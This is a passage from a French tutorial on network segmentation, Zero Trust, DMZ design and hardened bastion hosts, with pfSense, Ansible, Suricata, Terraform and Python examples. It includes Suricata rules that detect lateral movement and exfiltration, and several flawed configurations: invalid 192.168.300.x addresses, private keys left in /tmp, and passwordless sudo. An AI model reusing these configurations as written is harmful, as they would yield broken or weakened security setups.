La **segmentation réseau** divise une infrastructure en zones de sécurité distinctes, limitant la propagation des attaques et réduisant la surface d'exposition. Cette approche défensive transforme un réseau plat vulnérable en architecture multicouche où chaque segment a des politiques de sécurité spécifiques.

Imaginez la segmentation comme les **cloisons étanches d'un navire** : si une section est compromise (brèche), les autres compartiments restent protégés, empêchant le navire de couler entièrement. Chaque segment réseau fonctionne indépendamment avec ses propres contrôles d'accès et mécanismes de surveillance.

### Architecture de segmentation multicouche

```
Segmentation Réseau Enterprise :

                    Internet
                        │
                   ┌────▼────┐
                   │ Firewall│ Next-Gen Firewall
                   │ Perimeter│ (IPS/IDS intégré)
                   └────┬────┘
                        │
                   ┌────▼────┐
                   │   DMZ   │ VLAN 100 (192.168.100.0/24)
                   │         │ Zone démilitarisée
              ┌────┴─────────┴────┐
              │                   │
         ┌────▼────┐         ┌────▼────┐
         │Web Srv  │         │Mail Srv │
         │Public   │         │Relay    │
         └─────────┘         └─────────┘
                        │
                   ┌────▼────┐
                   │Internal │ Firewall interne
                   │Firewall │ (Micro-segmentation)
                   └────┬────┘
                        │
        ┌───────────────┼───────────────┐
        │               │               │
   ┌────▼────┐     ┌────▼────┐     ┌────▼────┐
   │ Users   │     │Servers  │     │ Admin   │
   │VLAN 10  │     │VLAN 20  │     │VLAN 30  │
   │Trust:Low│     │Trust:Med│     │Trust:High│
   └─────────┘     └─────────┘     └─────────┘
        │               │               │
   ┌────▼────┐     ┌────▼────┐     ┌────▼────┐
   │Endpoints│     │App Srv  │     │Domain   │
   │Clients  │     │Database │     │Controllers│
   │BYOD     │     │File Srv │     │Backup   │
   └─────────┘     └─────────┘     └─────────┘

Zones de confiance :
┌─────────────┬─────────────┬─────────────┬─────────────┐
│ Zone        │ Trust Level │ Access      │ Monitoring  │
├─────────────┼─────────────┼─────────────┼─────────────┤
│ Internet    │ Untrusted   │ Denied      │ Full        │
│ DMZ         │ Low         │ Restricted  │ Enhanced    │
│ Users       │ Medium      │ Controlled  │ Standard    │
│ Servers     │ High        │ Managed     │ Detailed    │
│ Admin       │ Critical    │ Privileged  │ Intensive   │
└─────────────┴─────────────┴─────────────┴─────────────┘
```

### Implémentation avec pfSense

**Configuration pfSense pour micro-segmentation :**

```bash
# Configuration via CLI pfSense
# /conf/config.xml

# Interface VLAN configuration
<vlans>
    <vlan>
        <if>em1</if>
        <tag>10</tag>
        <descr>USERS_VLAN</descr>
        <vlanif>em1.10</vlanif>
    </vlan>
    <vlan>
        <if>em1</if>
        <tag>20</tag>
        <descr>SERVERS_VLAN</descr>
        <vlanif>em1.20</vlanif>
    </vlan>
    <vlan>
        <if>em1</if>
        <tag>30</tag>
        <descr>ADMIN_VLAN</descr>
        <vlanif>em1.30</vlanif>
    </vlan>
    <vlan>
        <if>em1</if>
        <tag>100</tag>
        <descr>DMZ_VLAN</descr>
        <vlanif>em1.100</vlanif>
    </vlan>
</vlans>

# Firewall rules pour segmentation
<filter>
    <rule>
        <type>block</type>
        <interface>USERS_VLAN</interface>
        <source>
            <network>USERS_VLAN</network>
        </source>
        <destination>
            <network>ADMIN_VLAN</network>
        </destination>
        <descr>Block Users to Admin</descr>
    </rule>
    
    <rule>
        <type>pass</type>
        <interface>USERS_VLAN</interface>
        <source>
            <network>USERS_VLAN</network>
        </source>
        <destination>
            <network>SERVERS_VLAN</network>
        </destination>
        <protocol>tcp</protocol>
        <destination>
            <port>80,443</port>
        </destination>
        <descr>Allow Users to Web Services</descr>
    </rule>
    
    <rule>
        <type>pass</type>
        <interface>ADMIN_VLAN</interface>
        <source>
            <network>ADMIN_VLAN</network>
        </source>
        <destination>
            <any/>
        </destination>
        <descr>Allow Admin Full Access</descr>
    </rule>
</filter>
```

**Automatisation avec Ansible :**

```yaml
# playbooks/pfsense-segmentation.yml
---
- name: Configure pfSense Network Segmentation
  hosts: pfsense_firewalls
  gather_facts: no
  vars:
    pfsense_user: admin
    pfsense_password: "{{ vault_pfsense_password }}"
    
  tasks:
    - name: Configure VLANs
      pfsense_vlan:
        name: "{{ item.name }}"
        interface: "{{ item.interface }}"
        vlan_id: "{{ item.vlan_id }}"
        description: "{{ item.description }}"
        state: present
      loop:
        - { name: "USERS_VLAN", interface: "em1", vlan_id: 10, description: "User Workstations" }
        - { name: "SERVERS_VLAN", interface: "em1", vlan_id: 20, description: "Application Servers" }
        - { name: "ADMIN_VLAN", interface: "em1", vlan_id: 30, description: "Administrative Access" }
        - { name: "DMZ_VLAN", interface: "em1", vlan_id: 100, description: "Demilitarized Zone" }
        
    - name: Configure interface assignments
      pfsense_interface:
        descr: "{{ item.descr }}"
        if: "{{ item.if }}"
        ipaddr: "{{ item.ipaddr }}"
        subnet: "{{ item.subnet }}"
        state: present
      loop:
        - { descr: "USERS", if: "em1.10", ipaddr: "192.168.10.1", subnet: "24" }
        - { descr: "SERVERS", if: "em1.20", ipaddr: "192.168.20.1", subnet: "24" }
        - { descr: "ADMIN", if: "em1.30", ipaddr: "192.168.30.1", subnet: "24" }
        - { descr: "DMZ", if: "em1.100", ipaddr: "192.168.100.1", subnet: "24" }
        
    - name: Configure firewall rules - Block inter-VLAN by default
      pfsense_rule:
        name: "{{ item.name }}"
        action: "{{ item.action }}"
        interface: "{{ item.interface }}"
        source: "{{ item.source }}"
        destination: "{{ item.destination }}"
        protocol: "{{ item.protocol | default('any') }}"
        port: "{{ item.port | default('any') }}"
        state: present
      loop:
        # Default deny rules
        - name: "Block Users to Admin"
          action: "block"
          interface: "USERS"
          source: "USERS:network"
          destination: "ADMIN:network"
          
        - name: "Block Users to Servers Management"
          action: "block"
          interface: "USERS"
          source: "USERS:network"
          destination: "SERVERS:network"
          protocol: "tcp"
          port: "22,3389,5985,5986"
          
        # Allow specific services
        - name: "Allow Users to Web Services"
          action: "pass"
          interface: "USERS"
          source: "USERS:network"
          destination: "SERVERS:network"
          protocol: "tcp"
          port: "80,443"
          
        - name: "Allow Users to DNS"
          action: "pass"
          interface: "USERS"
          source: "USERS:network"
          destination: "SERVERS:network"
          protocol: "udp"
          port: "53"
          
        # Admin access
        - name: "Allow Admin Full Access"
          action: "pass"
          interface: "ADMIN"
          source: "ADMIN:network"
          destination: "any"
```

### Micro-segmentation avec Open vSwitch

**Configuration SDN avancée :**

```bash
# Configuration Open vSwitch pour micro-segmentation
ovs-vsctl add-br br-security

# Création des ports VLAN
ovs-vsctl add-port br-security vlan10 tag=10 -- set interface vlan10 type=internal
ovs-vsctl add-port br-security vlan20 tag=20 -- set interface vlan20 type=internal
ovs-vsctl add-port br-security vlan30 tag=30 -- set interface vlan30 type=internal

# Configuration IP des interfaces VLAN
ip addr add 192.168.10.1/24 dev vlan10
ip addr add 192.168.20.1/24 dev vlan20
ip addr add 192.168.30.1/24 dev vlan30

ip link set vlan10 up
ip link set vlan20 up
ip link set vlan30 up

# Règles OpenFlow pour micro-segmentation
# Bloquer trafic inter-VLAN par défaut
ovs-ofctl add-flow br-security "table=0,priority=100,dl_vlan=10,actions=output:CONTROLLER"
ovs-ofctl add-flow br-security "table=0,priority=100,dl_vlan=20,actions=output:CONTROLLER"
ovs-ofctl add-flow br-security "table=0,priority=100,dl_vlan=30,actions=output:CONTROLLER"

# Autoriser trafic intra-VLAN
ovs-ofctl add-flow br-security "table=0,priority=200,dl_vlan=10,dl_dst=ff:ff:ff:ff:ff:ff,actions=flood"
ovs-ofctl add-flow br-security "table=0,priority=200,dl_vlan=20,dl_dst=ff:ff:ff:ff:ff:ff,actions=flood"
ovs-ofctl add-flow br-security "table=0,priority=200,dl_vlan=30,dl_dst=ff:ff:ff:ff:ff:ff,actions=flood"

# Règles spécifiques pour services autorisés
# Users (VLAN 10) vers Servers (VLAN 20) - HTTP/HTTPS uniquement
ovs-ofctl add-flow br-security "table=0,priority=300,dl_vlan=10,nw_proto=6,tp_dst=80,actions=mod_vlan_vid:20,output:NORMAL"
ovs-ofctl add-flow br-security "table=0,priority=300,dl_vlan=10,nw_proto=6,tp_dst=443,actions=mod_vlan_vid:20,output:NORMAL"

# Admin (VLAN 30) accès complet
ovs-ofctl add-flow br-security "table=0,priority=400,dl_vlan=30,actions=output:NORMAL"
```

### Zero Trust Network Architecture

**Implémentation Zero Trust :**

```python
#!/usr/bin/env python3
# zero-trust-controller.py

import json
import requests
import time
from datetime import datetime, timedelta

class ZeroTrustController:
    def __init__(self, config_file="zero-trust-config.json"):
        with open(config_file, 'r') as f:
            self.config = json.load(f)
        self.active_sessions = {}
        self.trust_scores = {}
        
    def authenticate_device(self, device_id, user_id, device_info):
        """Authentification continue des devices"""
        trust_score = self.calculate_trust_score(device_id, user_id, device_info)
        
        if trust_score >= self.config['min_trust_score']:
            session_id = self.create_session(device_id, user_id, trust_score)
            self.apply_network_policies(session_id, trust_score)
            return session_id
        else:
            self.deny_access(device_id, user_id, trust_score)
            return None
            
    def calculate_trust_score(self, device_id, user_id, device_info):
        """Calcul du score de confiance basé sur multiples facteurs"""
        score = 50  # Score de base
        
        # Facteur géolocalisation
        if device_info.get('location') in self.config['trusted_locations']:
            score += 20
        elif device_info.get('location') in self.config['suspicious_locations']:
            score -= 30
            
        # Facteur temporel
        current_hour = datetime.now().hour
        if 8 <= current_hour <= 18:  # Heures de bureau
            score += 10
        elif 22 <= current_hour or current_hour <= 6:  # Nuit
            score -= 15
            
        # Historique du device
        device_history = self.get_device_history(device_id)
        if device_history['incidents'] == 0:
            score += 15
        else:
            score -= device_history['incidents'] * 5
            
        # Comportement utilisateur
        user_behavior = self.analyze_user_behavior(user_id)
        score += user_behavior['anomaly_score']
        
        return max(0, min(100, score))
        
    def apply_network_policies(self, session_id, trust_score):
        """Application des politiques réseau basées sur le trust score"""
        session = self.active_sessions[session_id]
        device_ip = session['device_ip']
        
        if trust_score >= 80:
            # Accès complet
            self.configure_firewall_rules(device_ip, "full_access")
            self.set_bandwidth_limit(device_ip, None)
            
        elif trust_score >= 60:
            # Accès limité
            self.configure_firewall_rules(device_ip, "limited_access")
            self.set_bandwidth_limit(device_ip, "10Mbps")
            
        elif trust_score >= 40:
            # Accès restreint
            self.configure_firewall_rules(device_ip, "restricted_access")
            self.set_bandwidth_limit(device_ip, "5Mbps")
            self.enable_enhanced_monitoring(device_ip)
            
        else:
            # Accès minimal (quarantaine)
            self.configure_firewall_rules(device_ip, "quarantine")
            self.set_bandwidth_limit(device_ip, "1Mbps")
            self.enable_enhanced_monitoring(device_ip)
            
    def configure_firewall_rules(self, device_ip, policy_type):
        """Configuration dynamique des règles firewall"""
        policies = {
            "full_access": {
                "allowed_ports": "any",
                "allowed_destinations": "any",
                "monitoring_level": "standard"
            },
            "limited_access": {
                "allowed_ports": [80, 443, 53, 22],
                "allowed_destinations": ["internal_servers", "internet"],
                "monitoring_level": "enhanced"
            },
            "restricted_access": {
                "allowed_ports": [80, 443, 53],
                "allowed_destinations": ["internal_servers"],
                "monitoring_level": "intensive"
            },
            "quarantine": {
                "allowed_ports": [80, 443],
                "allowed_destinations": ["security_portal"],
                "monitoring_level": "maximum"
            }
        }
        
        policy = policies[policy_type]
        
        # Configuration pfSense via API
        pfsense_config = {
            "source": device_ip,
            "destination": policy["allowed_destinations"],
            "ports": policy["allowed_ports"],
            "action": "pass",
            "description": f"Zero Trust - {policy_type}"
        }
        
        self.update_pfsense_rules(pfsense_config)
        
    def continuous_monitoring(self):
        """Surveillance continue et réévaluation des trust scores"""
        while True:
            for session_id, session in self.active_sessions.items():
                # Réévaluation périodique
                new_trust_score = self.reevaluate_trust_score(session_id)
                
                if abs(new_trust_score - session['trust_score']) > 10:
                    # Changement significatif du trust score
                    session['trust_score'] = new_trust_score
                    self.apply_network_policies(session_id, new_trust_score)
                    
                # Vérification des anomalies réseau
                if self.detect_network_anomalies(session['device_ip']):
                    self.handle_security_incident(session_id)
                    
            time.sleep(60)  # Réévaluation toutes les minutes
            
    def detect_network_anomalies(self, device_ip):
        """Détection d'anomalies réseau en temps réel"""
        # Analyse du trafic réseau
        traffic_stats = self.get_traffic_stats(device_ip)
        
        anomalies = []
        
        # Détection de scan de ports
        if traffic_stats['unique_destinations'] > 100:
            anomalies.append("port_scanning")
            
        # Détection de transfert de données anormal
        if traffic_stats['bytes_out'] > 1000000000:  # 1GB
            anomalies.append("data_exfiltration")
            
        # Détection de connexions suspectes
        for destination in traffic_stats['destinations']:
            if destination in self.config['malicious_ips']:
                anomalies.append("malicious_communication")
                
        return len(anomalies) > 0
        
    def handle_security_incident(self, session_id):
        """Gestion des incidents de sécurité"""
        session = self.active_sessions[session_id]
        
        # Isolation immédiate
        self.configure_firewall_rules(session['device_ip'], "quarantine")
        
        # Notification SIEM
        incident_data = {
            "timestamp": datetime.now().isoformat(),
            "session_id": session_id,
            "device_ip": session['device_ip'],
            "user_id": session['user_id'],
            "incident_type": "network_anomaly",
            "severity": "high"
        }
        
        self.send_to_siem(incident_data)
        
        # Notification administrateur
        self.send_alert(f"Security incident detected for device {session['device_ip']}")

if __name__ == "__main__":
    controller = ZeroTrustController()
    controller.continuous_monitoring()
```

### Monitoring et détection d'intrusion

**Configuration Suricata pour segmentation :**

```yaml
# suricata.yaml
vars:
  address-groups:
    HOME_NET: "[192.168.10.0/24,192.168.20.0/24,192.168.30.0/24]"
    EXTERNAL_NET: "!$HOME_NET"
    DMZ_NET: "192.168.100.0/24"
    SERVERS_NET: "192.168.20.0/24"
    USERS_NET: "192.168.10.0/24"
    ADMIN_NET: "192.168.30.0/24"

rule-files:
  - segmentation-rules.rules
  - lateral-movement.rules
  - data-exfiltration.rules

# Règles personnalisées pour segmentation
# /etc/suricata/rules/segmentation-rules.rules
alert tcp $USERS_NET any -> $ADMIN_NET any (msg:"Unauthorized access to admin network"; sid:1000001; rev:1;)
alert tcp $USERS_NET any -> $SERVERS_NET ![80,443,53] (msg:"Unauthorized service access from users"; sid:1000002; rev:1;)
alert tcp any any -> $DMZ_NET 22 (msg:"SSH access to DMZ from internal network"; sid:1000003; rev:1;)
alert tcp $EXTERNAL_NET any -> $SERVERS_NET any (msg:"Direct external access to servers"; sid:1000004; rev:1;)

# Détection de mouvement latéral
alert smb any any -> $SERVERS_NET 445 (msg:"SMB lateral movement attempt"; sid:1000010; rev:1;)
alert tcp any any -> any 3389 (msg:"RDP lateral movement"; sid:1000011; rev:1;)
alert tcp any any -> any [5985,5986] (msg:"WinRM lateral movement"; sid:1000012; rev:1;)
```

### Cas d'usage spécialisés

**Environnement healthcare :** Implémentez une segmentation stricte pour séparer les systèmes médicaux critiques (VLAN isolé), les postes administratifs, et les équipements IoT médicaux avec des politiques de sécurité spécifiques à HIPAA.

**Infrastructure industrielle :** Créez une segmentation OT/IT avec des zones dédiées pour les systèmes SCADA, les automates programmables, et les réseaux de capteurs, avec des passerelles sécurisées pour les communications inter-zones.

**Environnement multi-tenant :** Déployez une micro-segmentation par client avec isolation complète des données et des flux réseau, permettant une facturation et une surveillance individualisées.

---

## 7.3 DMZ et bastions

### Architecture DMZ moderne

Une **DMZ (Demilitarized Zone)** crée une zone tampon entre le réseau interne et Internet, hébergeant les services publics tout en protégeant l'infrastructure interne. Cette architecture de sécurité multicouche utilise des bastions comme points d'accès contrôlés et surveillés.

Imaginez une DMZ comme le **hall d'accueil d'un bâtiment sécurisé** : les visiteurs peuvent accéder aux services publics (réception, salle de conférence) sans jamais pénétrer dans les bureaux privés. Les bastions sont les **agents de sécurité** qui contrôlent et enregistrent tous les accès vers les zones sensibles.

### Topologie DMZ multicouche

```
Architecture DMZ Enterprise :

                    Internet
                        │
                   ┌────▼────┐
                   │ Edge    │ Firewall périmètre
                   │Firewall │ (WAF + DDoS protection)
                   └────┬────┘
                        │
                   ┌────▼────┐
                   │External │ DMZ externe
                   │  DMZ    │ VLAN 100
              ┌────┴─────────┴────┐
              │                   │
         ┌────▼────┐         ┌────▼────┐
         │Web Srv  │         │Mail     │
         │Reverse  │         │Gateway  │
         │Proxy    │         │(Relay)  │
         └─────────┘         └─────────┘
                        │
                   ┌────▼────┐
                   │Internal │ Firewall interne
                   │Firewall │ (Application aware)
                   └────┬────┘
                        │
                   ┌────▼────┐
                   │Internal │ DMZ interne
                   │  DMZ    │ VLAN 200
              ┌────┴─────────┴────┐
              │                   │
         ┌────▼────┐         ┌────▼────┐
         │App Srv  │         │Database │
         │(Internal│         │Proxy    │
         │Services)│         │         │
         └─────────┘         └─────────┘
                        │
                   ┌────▼────┐
                   │Bastion  │ Jump servers
                   │ Hosts   │ VLAN 300
              ┌────┴─────────┴────┐
              │                   │
         ┌────▼────┐         ┌────▼────┐
         │SSH      │         │RDP      │
         │Bastion  │         │Bastion  │
         │(Linux)  │         │(Windows)│
         └─────────┘         └─────────┘
                        │
                   ┌────▼────┐
                   │Core     │ Firewall cœur
                   │Firewall │ (Zero Trust)
                   └────┬────┘
                        │
                   ┌────▼────┐
                   │Internal │ Réseau interne
                   │Network  │ VLAN 10-50
                   └─────────┘

Flux de sécurité :
Internet → Edge FW → Ext DMZ → Int FW → Int DMZ → Bastion → Core FW → Internal
```

### Configuration pfSense DMZ

**Configuration multicouche avec pfSense :**

```bash
# Configuration pfSense pour DMZ
# /conf/config.xml

<interfaces>
    <wan>
        <enable/>
        <if>em0</if>
        <ipaddr>dhcp</ipaddr>
        <descr>WAN</descr>
    </wan>
    
    <lan>
        <enable/>
        <if>em1</if>
        <ipaddr>192.168.1.1</ipaddr>
        <subnet>24</subnet>
        <descr>LAN</descr>
    </lan>
    
    <opt1>
        <enable/>
        <if>em2</if>
        <ipaddr>192.168.100.1</ipaddr>
        <subnet>24</subnet>
        <descr>DMZ_EXTERNAL</descr>
    </opt1>
    
    <opt2>
        <enable/>
        <if>em3</if>
        <ipaddr>192.168.200.1</ipaddr>
        <subnet>24</subnet>
        <descr>DMZ_INTERNAL</descr>
    </opt2>
    
    <opt3>
        <enable/>
        <if>em4</if>
        <ipaddr>192.168.300.1</ipaddr>
        <subnet>24</subnet>
        <descr>BASTION</descr>
    </opt3>
</interfaces>

# Règles firewall DMZ
<filter>
    <!-- Internet vers DMZ externe -->
    <rule>
        <type>pass</type>
        <interface>wan</interface>
        <source><any/></source>
        <destination>
            <address>192.168.100.10</address>
        </destination>
        <protocol>tcp</protocol>
        <destination><port>80,443</port></destination>
        <descr>Allow HTTP/HTTPS to Web Server</descr>
    </rule>
    
    <rule>
        <type>pass</type>
        <interface>wan</interface>
        <source><any/></source>
        <destination>
            <address>192.168.100.20</address>
        </destination>
        <protocol>tcp</protocol>
        <destination><port>25,587</port></destination>
        <descr>Allow SMTP to Mail Gateway</descr>
    </rule>
    
    <!-- DMZ externe vers DMZ interne -->
    <rule>
        <type>pass</type>
        <interface>dmz_external</interface>
        <source>
            <address>192.168.100.10</address>
        </source>
        <destination>
            <network>DMZ_INTERNAL</network>
        </destination>
        <protocol>tcp</protocol>
        <destination><port>8080,3306</port></destination>
        <descr>Web to App/DB</descr>
    </rule>
    
    <!-- Bastion vers LAN -->
    <rule>
        <type>pass</type>
        <interface>bastion</interface>
        <source>
            <network>BASTION</network>
        </source>
        <destination>
            <network>LAN</network>
        </destination>
        <protocol>tcp</protocol>
        <destination><port>22,3389</port></destination>
        <descr>Bastion to Internal</descr>
    </rule>
    
    <!-- Bloquer tout le reste -->
    <rule>
        <type>block</type>
        <interface>dmz_external</interface>
        <source><any/></source>
        <destination><any/></destination>
        <descr>Block all other DMZ external</descr>
    </rule>
</filter>
```

### Bastions sécurisés avec Terraform

**Déploiement automatisé de bastions :**

```hcl
# bastion-infrastructure.tf
variable "environment" {
  description = "Environment name"
  type        = string
  default     = "production"
}

variable "allowed_cidr_blocks" {
  description = "CIDR blocks allowed to access bastion"
  type        = list(string)
  default     = ["203.0.113.0/24"]  # IP publiques autorisées
}

# SSH Bastion (Linux)
resource "proxmox_vm_qemu" "ssh_bastion" {
  name        = "bastion-ssh-${var.environment}"
  target_node = "proxmox1"
  
  clone      = "ubuntu-22.04-hardened-template"
  full_clone = true
  
  # Configuration sécurisée
  cores  = 2
  memory = 4096
  
  disk {
    size    = "20G"
    storage = "local-ssd"  # SSD pour logs
    discard = "on"
  }
  
  # Interface DMZ
  network {
    model  = "virtio"
    bridge = "vmbr0"
    tag    = 300  # VLAN Bastion
  }
  
  # Configuration réseau
  ipconfig0 = "ip=192.168.300.10/24,gw=192.168.300.1"
  nameserver = "8.8.8.8"
  sshkeys   = file("~/.ssh/bastion_rsa.pub")
  
  # Cloud-init pour durcissement
  cicustom = "user=local:snippets/bastion-cloudinit.yml"
  
  tags = "${var.environment},bastion,ssh,security"
}

# RDP Bastion (Windows)
resource "proxmox_vm_qemu" "rdp_bastion" {
  name        = "bastion-rdp-${var.environment}"
  target_node = "proxmox2"
  
  clone      = "windows-server-2022-hardened-template"
  full_clone = true
  
  cores  = 4
  memory = 8192
  
  disk {
    size    = "60G"
    storage = "ceph-storage"
  }
  
  network {
    model  = "virtio"
    bridge = "vmbr0"
    tag    = 300
  }
  
  ipconfig0 = "ip=192.168.300.20/24,gw=192.168.300.1"
  
  tags = "${var.environment},bastion,rdp,windows"
}

# Load Balancer pour bastions (HA)
resource "proxmox_vm_qemu" "bastion_lb" {
  name        = "bastion-lb-${var.environment}"
  target_node = "proxmox3"
  
  clone      = "ubuntu-22.04-template"
  full_clone = true
  
  cores  = 2
  memory = 2048
  
  disk {
    size    = "20G"
    storage = "local-lvm"
  }
  
  network {
    model  = "virtio"
    bridge = "vmbr0"
    tag    = 300
  }
  
  ipconfig0 = "ip=192.168.300.5/24,gw=192.168.300.1"
  sshkeys   = file("~/.ssh/id_rsa.pub")
  
  tags = "${var.environment},bastion,loadbalancer,haproxy"
}

# Outputs
output "bastion_access" {
  value = {
    ssh_bastion = {
      ip = proxmox_vm_qemu.ssh_bastion.default_ipv4_address
      command = "ssh -i ~/.ssh/bastion_rsa admin@${proxmox_vm_qemu.ssh_bastion.default_ipv4_address}"
    }
    rdp_bastion = {
      ip = proxmox_vm_qemu.rdp_bastion.default_ipv4_address
      command = "rdesktop ${proxmox_vm_qemu.rdp_bastion.default_ipv4_address}"
    }
    lb_endpoint = proxmox_vm_qemu.bastion_lb.default_ipv4_address
  }
}
```

### Configuration sécurisée des bastions

**Durcissement SSH Bastion :**

```yaml
# cloud-init/bastion-cloudinit.yml
#cloud-config
users:
  - name: admin
    groups: sudo
    shell: /bin/bash
    ssh_authorized_keys:
      - ssh-rsa AAAAB3NzaC1yc2E... bastion-key
    sudo: ['ALL=(ALL) NOPASSWD:ALL']

packages:
  - fail2ban
  - auditd
  - rsyslog
  - chrony
  - ufw

write_files:
  - path: /etc/ssh/sshd_config
    content: |
      # SSH Hardening Configuration
      Port 22
      Protocol 2
      
      # Authentication
      PermitRootLogin no
      PasswordAuthentication no
      PubkeyAuthentication yes
      AuthorizedKeysFile .ssh/authorized_keys
      
      # Security
      AllowUsers admin
      MaxAuthTries 3
      MaxSessions 2
      LoginGraceTime 30
      
      # Logging
      LogLevel VERBOSE
      SyslogFacility AUTH
      
      # Network
      ClientAliveInterval 300
      ClientAliveCountMax 2
      TCPKeepAlive no
      
      # Disable dangerous features
      AllowAgentForwarding no
      AllowTcpForwarding yes
      X11Forwarding no
      PermitTunnel no
      
  - path: /etc/fail2ban/jail.local
    content: |
      [DEFAULT]
      bantime = 3600
      findtime = 600
      maxretry = 3
      
      [sshd]
      enabled = true
      port = ssh
      filter = sshd
      logpath = /var/log/auth.log
      maxretry = 3
      bantime = 86400
      
  - path: /etc/audit/rules.d/bastion.rules
    content: |
      # Audit rules for bastion host
      -w /etc/passwd -p wa -k identity
      -w /etc/group -p wa -k identity
      -w /etc/shadow -p wa -k identity
      -w /etc/sudoers -p wa -k privilege_escalation
      -w /var/log/auth.log -p wa -k authentication
      -a always,exit -F arch=b64 -S execve -k command_execution
      -a always,exit -F arch=b32 -S execve -k command_execution
      
  - path: /opt/bastion-monitor.sh
    permissions: '0755'
    content: |
      #!/bin/bash
      # Bastion monitoring script
      
      LOG_FILE="/var/log/bastion-activity.log"
      
      # Log all SSH connections
      who | while read line; do
          echo "$(date): Active session: $line" >> $LOG_FILE
      done
      
      # Check for suspicious activity
      FAILED_LOGINS=$(grep "Failed password" /var/log/auth.log | wc -l)
      if [ $FAILED_LOGINS -gt 10 ]; then
          echo "$(date): WARNING: $FAILED_LOGINS failed login attempts" >> $LOG_FILE
          # Send alert to SIEM
          logger -p auth.warning "Bastion: High number of failed logins: $FAILED_LOGINS"
      fi
      
      # Monitor disk space
      DISK_USAGE=$(df / | awk 'NR==2 {print $5}' | sed 's/%//')
      if [ $DISK_USAGE -gt 80 ]; then
          echo "$(date): WARNING: Disk usage at $DISK_USAGE%" >> $LOG_FILE
      fi

runcmd:
  - systemctl enable fail2ban
  - systemctl start fail2ban
  - systemctl enable auditd
  - systemctl start auditd
  - systemctl restart sshd
  - ufw --force enable
  - ufw allow 22/tcp
  - ufw default deny incoming
  - ufw default allow outgoing
  - echo "*/5 * * * * /opt/bastion-monitor.sh" | crontab -
  - echo "Bastion configuration completed" >> /var/log/cloud-init.log
```

### Proxy et tunneling sécurisé

**Configuration HAProxy pour bastion :**

```bash
# /etc/haproxy/haproxy.cfg
global
    daemon
    user haproxy
    group haproxy
    log 127.0.0.1:514 local0
    chroot /var/lib/haproxy
    stats socket /run/haproxy/admin.sock mode 660 level admin
    
defaults
    mode tcp
    log global
    option tcplog
    option dontlognull
    timeout connect 5000ms
    timeout client 50000ms
    timeout server 50000ms
    
# SSH Load Balancing
frontend ssh_frontend
    bind *:22
    mode tcp
    default_backend ssh_bastions
    
backend ssh_bastions
    mode tcp
    balance roundrobin
    option tcp-check
    tcp-check connect
    server bastion1 192.168.300.10:22 check
    server bastion2 192.168.300.11:22 check backup
    
# RDP Load Balancing  
frontend rdp_frontend
    bind *:3389
    mode tcp
    default_backend rdp_bastions
    
backend rdp_bastions
    mode tcp
    balance roundrobin
    option tcp-check
    tcp-check connect port 3389
    server rdp-bastion1 192.168.300.20:3389 check
    server rdp-bastion2 192.168.300.21:3389 check backup
    
# Statistics
frontend stats
    bind *:8404
    mode http
    stats enable
    stats uri /stats
    stats refresh 30s
    stats admin if TRUE
```

### Monitoring et audit des bastions

**Configuration ELK pour bastions :**

```yaml
# filebeat-bastion.yml
filebeat.inputs:
- type: log
  enabled: true
  paths:
    - /var/log/auth.log
    - /var/log/audit/audit.log
    - /var/log/bastion-activity.log
  fields:
    log_type: bastion
    environment: production
    
- type: log
  enabled: true
  paths:
    - /var/log/haproxy.log
  fields:
    log_type: haproxy
    service: bastion_lb
    
output.logstash:
  hosts: ["192.168.50.10:5044"]
  
processors:
- add_host_metadata:
    when.not.contains.tags: forwarded
```

**Dashboard Grafana pour bastions :**

```json
{
  "dashboard": {
    "title": "Bastion Hosts Monitoring",
    "panels": [
      {
        "title": "Active SSH Sessions",
        "type": "stat",
        "targets": [
          {
            "expr": "count(up{job=\"bastion-ssh\"})",
            "legendFormat": "Active Bastions"
          }
        ]
      },
      {
        "title": "Failed Login Attempts",
        "type": "graph",
        "targets": [
          {
            "expr": "rate(bastion_failed_logins_total[5m])",
            "legendFormat": "Failed Logins/min"
          }
        ]
      },
      {
        "title": "Command Execution",
        "type": "table",
        "targets": [
          {
            "expr": "bastion_commands_executed",
            "legendFormat": "Commands"
          }
        ]
      }
    ]
  }
}
```

### Automatisation et orchestration

**Script de gestion des accès :**

```python
#!/usr/bin/env python3
# bastion-access-manager.py

import json
import subprocess
import time
from datetime import datetime, timedelta
import requests

class BastionAccessManager:
    def __init__(self, config_file="bastion-config.json"):
        with open(config_file, 'r') as f:
            self.config = json.load(f)
        self.active_sessions = {}
        
    def request_access(self, user_id, target_host, justification, duration_hours=8):
        """Demande d'accès temporaire via bastion"""
        request_id = f"req_{int(time.time())}"
        
        access_request = {
            "request_id": request_id,
            "user_id": user_id,
            "target_host": target_host,
            "justification": justification,
            "duration_hours": duration_hours,
            "requested_at": datetime.now().isoformat(),
            "status": "pending"
        }
        
        # Validation automatique pour certains utilisateurs
        if user_id in self.config['auto_approve_users']:
            return self.approve_access(request_id, access_request)
        else:
            return self.send_for_approval(request_id, access_request)
            
    def approve_access(self, request_id, access_request):
        """Approbation et configuration de l'accès"""
        user_id = access_request['user_id']
        target_host = access_request['target_host']
        duration = access_request['duration_hours']
        
        # Génération clé SSH temporaire
        key_path = f"/tmp/temp_key_{request_id}"
        subprocess.run([
            "ssh-keygen", "-t", "rsa", "-b", "4096",
            "-f", key_path, "-N", "", "-C", f"temp_access_{user_id}"
        ])
        
        # Déploiement clé sur bastion
        self.deploy_temp_key(user_id, f"{key_path}.pub", duration)
        
        # Configuration firewall temporaire
        self.configure_temp_firewall_rule(user_id, target_host, duration)
        
        # Programmation révocation
        revoke_time = datetime.now() + timedelta(hours=duration)
        self.schedule_revocation(request_id, revoke_time)
        
        # Notification utilisateur
        access_info = {
            "request_id": request_id,
            "ssh_command": f"ssh -i {key_path} {user_id}@{self.config['bastion_host']}",
            "target_command": f"ssh {target_host}",
            "expires_at": revoke_time.isoformat(),
            "private_key": open(key_path, 'r').read()
        }
        
        return access_info
        
    def deploy_temp_key(self, user_id, public_key_path, duration_hours):
        """Déploiement clé temporaire sur bastion"""
        with open(public_key_path, 'r') as f:
            public_key = f.read().strip()
            
        # Ajout clé avec restriction temporelle
        authorized_keys_entry = f'command="echo \'Access expires in {duration_hours} hours\'",no-port-forwarding,no-X11-forwarding {public_key}'
        
        # Déploiement via Ansible
        ansible_playbook = f"""
- hosts: bastion_hosts
  tasks:
    - name: Add temporary SSH key
      authorized_key:
        user: {user_id}
        key: "{public_key}"
        key_options: 'command="echo Access expires in {duration_hours} hours",no-port-forwarding,no-X11-forwarding'
        state: present
"""
        
        with open(f"/tmp/deploy_key_{user_id}.yml", 'w') as f:
            f.write(ansible_playbook)
            
